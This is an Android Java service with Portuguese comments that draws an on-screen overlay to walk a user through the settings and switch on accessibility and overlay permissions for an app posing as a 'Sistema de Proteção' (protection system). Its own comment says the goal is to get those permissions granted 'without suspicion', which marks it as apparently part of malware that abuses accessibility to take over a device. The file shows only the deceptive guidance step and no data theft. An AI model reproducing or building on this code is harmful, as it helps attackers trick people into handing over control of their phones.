package com.seguranca.protecao;

import android.app.Service;
import android.content.Intent;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.FrameLayout;

/**
 * Overlay de GUIA VISUAL que orienta o usuário
 * 
 * Mostra instruções em tempo real enquanto usuário navega pelas configurações:
 * - Setas animadas apontando onde clicar
 * - Texto de instrução
 * - Destaques visuais
 * 
 * Guia o usuário passo a passo para ativar permissões sem suspeitas
 */
public class GuidedOverlayService extends Service {
    
    private static final String TAG = "GuidedOverlay";
    
    private WindowManager windowManager;
    private View overlayView;
    private String guideType = "";
    private int currentStep = 0;
    private Handler handler = new Handler();
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            guideType = intent.getStringExtra("guide_type");
            
            if ("accessibility".equals(guideType)) {
                showAccessibilityGuide();
            } else if ("overlay".equals(guideType)) {
                showOverlayGuide();
            }
        }
        
        return START_STICKY;
    }
    
    /**
     * Mostra guia para ativar acessibilidade
     */
    private void showAccessibilityGuide() {
        if (overlayView != null) {
            windowManager.removeView(overlayView);
        }
        
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        
        // Cria view de instrução
        overlayView = new GuidedInstructionView(this);
        
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.WRAP_CONTENT,
            getOverlayType(),
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
            PixelFormat.TRANSLUCENT
        );
        
        params.gravity = Gravity.TOP;
        params.y = 100;
        
        windowManager.addView(overlayView, params);
        
        // Remove após 10 segundos
        handler.postDelayed(() -> {
            stopSelf();
        }, 10000);
    }
    
    /**
     * Mostra guia para overlay permission
     */
    private void showOverlayGuide() {
        // Similar ao anterior
        showAccessibilityGuide();
    }
    
    /**
     * Retorna tipo de overlay baseado na versão Android
     */
    private int getOverlayType() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            return WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
        } else {
            return WindowManager.LayoutParams.TYPE_PHONE;
        }
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        
        if (overlayView != null && windowManager != null) {
            try {
                windowManager.removeView(overlayView);
            } catch (Exception e) {
                // Ignore
            }
        }
    }
    
    /**
     * View customizada para mostrar instruções
     */
    private class GuidedInstructionView extends FrameLayout {
        
        private Paint paint;
        private String instruction = "👇 Encontre 'Sistema de Proteção' e toque para ativar";
        
        public GuidedInstructionView(android.content.Context context) {
            super(context);
            
            setWillNotDraw(false);
            setBackgroundColor(Color.parseColor("#CC000000")); // Semi-transparente
            setPadding(40, 30, 40, 30);
            
            paint = new Paint();
            paint.setColor(Color.WHITE);
            paint.setTextSize(48);
            paint.setAntiAlias(true);
        }
        
        @Override
        protected void onDraw(Canvas canvas) {
            super.onDraw(canvas);
            
            // Desenha texto de instrução
            canvas.drawText(instruction, 50, 80, paint);
            
            // Aqui poderia adicionar animação de seta, etc.
        }
    }
}
